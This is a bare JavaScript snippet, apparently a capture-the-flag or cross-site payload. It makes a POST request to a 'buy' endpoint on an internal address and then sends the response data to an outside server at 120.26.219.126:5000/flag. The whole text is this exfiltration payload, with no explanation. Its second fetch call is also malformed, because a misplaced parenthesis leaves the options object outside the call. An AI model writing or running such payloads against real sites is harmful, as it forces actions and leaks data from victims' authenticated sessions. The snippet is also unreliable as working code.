const data = { 'id': "0" };
fetch("https://192.168.130.144/buy", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
    })
    .then((response) => response.json())
    .then((data) => {
        fetch("http://120.26.219.126:5000/flag"), {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: data,
        }
    })
    .catch((error) => {
        console.error("Error:", error);
    });
